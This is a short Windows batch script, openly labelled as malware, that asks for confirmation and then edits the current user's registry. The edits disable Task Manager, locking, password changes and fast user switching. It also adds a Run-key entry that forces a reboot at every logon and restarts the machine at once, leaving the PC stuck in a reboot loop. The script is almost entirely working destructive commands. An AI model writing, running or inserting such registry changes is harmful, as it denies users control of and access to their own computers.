@echo off
cls
title nopc
echo WOULD YOU LIKE TO EXECUTE THIS MALWARE, RESULTING IN AN UNUSABLE PC?
choice /c yn
if %ERRORLEVEL%==1 goto definitelynotdeath
if %ERRORLEVEL%==2 exit
if %ERRORLEVEL%==0 exit
if not %ERRORLEVEL%==1 exit
if not %ERRORLEVEL%==2 exit
if not %ERRORLEVEL%==0 exit




:definitelynotdeath
echo SAY GOODBYE TO YOUR PC!!!!!! HAHA!
ping localhost -n 5>nul
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1
REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableLockWorkStation /t REG_DWORD /d 1
REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableChangePassword /t REG_DWORD /d 1
REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v HideFastUserSwitching /t REG_DWORD /d 1
REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v RebootTask /t REG_SZ /d "C:\Windows\System32\shutdown.exe -r -t 0"
shutdown -r -t 0